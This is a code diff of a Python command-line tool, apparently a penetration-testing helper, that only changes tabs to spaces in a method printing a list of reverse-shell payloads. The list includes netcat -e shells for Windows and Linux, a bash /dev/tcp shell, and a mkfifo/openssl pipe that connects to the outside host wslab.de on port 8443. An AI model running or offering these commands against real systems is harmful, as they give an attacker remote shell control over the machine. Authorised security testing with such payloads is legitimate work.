@@ -72,14 +72,14 @@ class MyPrompt(Cmd):
 
     def do_show_payloads(self, inp):
         print("Show payloads...")
-	print("")
+        print("")
         print("REVERSE SHELLS")
-	print("--------------")
-	print("NETCAT (Windows): nc <ip> <port> -e cmd.exe")
-	print("NETCAT (LINUX): nc <ip> <port> -e /bin/bash") 
-	print("OS (LINUX): mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect wslab.de:8443 > /tmp/s; rm /tmp/s") 
-	print("OS (OSX): bash -i >& /dev/tcp/<ip>/<port> 0>&1") 
-	print("")
+        print("--------------")
+        print("NETCAT (Windows): nc <ip> <port> -e cmd.exe")
+        print("NETCAT (LINUX): nc <ip> <port> -e /bin/bash") 
+        print("OS (LINUX): mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect wslab.de:8443 > /tmp/s; rm /tmp/s") 
+        print("OS (OSX): bash -i >& /dev/tcp/<ip>/<port> 0>&1") 
+        print("")
 
     def do_exit(self, inp):
         print("Bye")
